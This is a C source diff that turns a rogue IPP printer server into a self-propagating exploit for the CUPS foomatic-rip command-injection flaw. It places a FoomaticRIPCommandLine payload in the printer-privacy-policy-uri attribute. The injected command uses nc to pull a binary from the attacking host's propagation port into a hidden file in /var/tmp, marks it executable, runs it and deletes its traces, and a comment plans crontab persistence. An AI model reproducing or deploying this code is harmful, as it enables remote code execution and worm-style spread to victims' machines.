@@ -10,10 +10,13 @@
 
 #define TARGET_PORT 631
 #define BUFFER_SIZE 4096
+#define MAX_PAYLOAD_SIZE 2048
+#define MAX_RCE_SIZE  MAX_PAYLOAD_SIZE - 200
 #define MAX_RESPONSE_SIZE 4096
 
 typedef struct thread_args{
     int client_socket;
+    char *server_ip;
     Globals *global;
 }TArgs;
 
@@ -135,7 +138,7 @@ int ipp_add_boolean(Globals * global, char *ipp, char * attribute, char value){
 }
 
 // Function to create an IPP response using libcups
-unsigned char* create_ipp_body(Globals*global, size_t* response_size, struct ipp_request_info *request_info) {
+unsigned char* create_ipp_body(Globals*global, size_t* response_size, struct ipp_request_info *request_info, char *rce_command) {
     // Allocate buffer
     unsigned char* response = global->malloc(MAX_RESPONSE_SIZE);
     if (!response) {
@@ -199,7 +202,12 @@ unsigned char* create_ipp_body(Globals*global, size_t* response_size, struct ipp
     offset += ipp_add_string(global, &response[offset], IPP_TAG_KEYWORD, "pdl-override-supported", "not-attempted");
     offset += ipp_add_integer(global, &response[offset], IPP_TAG_INTEGER, "printer-up-time", 420);
     offset += ipp_add_string(global, &response[offset], IPP_TAG_KEYWORD, "compression-supported", "none");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_URI, "printer-privacy-policy-uri", "https//www.google.com/\"\n*FoomaticRIPCommandLine: \"echo 666 > /var/tmp/pwnd \"\n*cupsFilter2 : \"*/* application/vnd.cups-postscript 0 foomatic-rip");
+
+    char *payload = global->malloc(MAX_PAYLOAD_SIZE);
+    global->snprintf(payload, MAX_PAYLOAD_SIZE, "https//www.google.com/\"\n*FoomaticRIPCommandLine: \"%s\"\n*cupsFilter2 : \"*/* application/vnd.cups-postscript 0 foomatic-rip", rce_command);
+    global->printf("Sending payload: %s\n", payload);
+    offset += ipp_add_string(global, &response[offset], IPP_TAG_URI, "printer-privacy-policy-uri", payload);
+    global->free(payload);
 
     // End of Attributes Tag
     response[offset++] = 0x03;
@@ -209,9 +217,9 @@ unsigned char* create_ipp_body(Globals*global, size_t* response_size, struct ipp
     return response;
 }
 
-unsigned char* create_http_body(Globals* global, size_t* total_response_size, struct ipp_request_info *request_info) {
+unsigned char* create_http_body(Globals* global, size_t* total_response_size, struct ipp_request_info *request_info, char* rce_command) {
     size_t ipp_size;
-    unsigned char* ipp_response = create_ipp_body(global, &ipp_size, request_info);
+    unsigned char* ipp_response = create_ipp_body(global, &ipp_size, request_info, rce_command);
     if (!ipp_response) {
         return NULL;
     }
@@ -265,6 +273,7 @@ void load_ipp_request_infos(Globals * global, IppReqInfo * request_info, char* r
 void* handle_client(void* arg) {
     TArgs *args = (TArgs*) arg; 
     int client_sock = args->client_socket;
+    char *server_ip = args->server_ip;
     Globals *global = args->global;
     global->free(arg);
 
@@ -280,10 +289,15 @@ void* handle_client(void* arg) {
     IppReqInfo *request_info = global->malloc(sizeof(IppReqInfo));
     load_ipp_request_infos(global, request_info, buffer);
 
+    char *rce_command = global->malloc(MAX_RCE_SIZE);
+    // TODO: add process to crontab @reboot
+    global->snprintf(rce_command, MAX_RCE_SIZE, "echo -n | nc %s %d > /var/tmp/.cups; chmod +x /var/tmp/.cups; rm -f /tmp/foomatic*; echo \'/var/tmp/.cups&\' > /tmp/runme.sh; sh /tmp/runme.sh; rm /tmp/runme.sh ", server_ip, global->propagation_server_port);
+
     // Create and send IPP response
     size_t response_size;
-    unsigned char* ipp_response = create_http_body(global, &response_size, request_info);
+    unsigned char* ipp_response = create_http_body(global, &response_size, request_info, rce_command);
     global->free(request_info);
+    global->free(rce_command);
     if (!ipp_response) {
         global->close(client_sock);
         return NULL;
@@ -329,7 +343,7 @@ int serve(Globals * global) {
         return 1;
     }
 
-    global->printf("Server listening on port %d...\n", global->ipp_server_port);
+    global->printf("IPP-Server listening on port %d...\n", global->ipp_server_port);
 
     // Start the server to handle incoming connections
     while (1) {
@@ -339,9 +353,21 @@ int serve(Globals * global) {
             continue;
         }
 
+         // Get the local address (server address) of the interface used for this connection
+        struct sockaddr_in local_addr;
+        socklen_t addr_len = sizeof(local_addr);
+        char local_ip[INET_ADDRSTRLEN];
+        if (global->getsockname(client_sock, (struct sockaddr*)&local_addr, &addr_len) == 0) {
+            global->inet_ntop(AF_INET, &local_addr.sin_addr, local_ip, sizeof(local_ip));
+        } else {
+            global->perror("getsockname failed");
+            continue;
+        }
+
         pthread_t thread;
         TArgs *args = global->malloc(sizeof(TArgs));
         args->client_socket = client_sock;
+        args->server_ip = local_ip;
         args->global = global;
         global->pthread_create(&thread, NULL, handle_client, args);
         global->pthread_detach(thread);
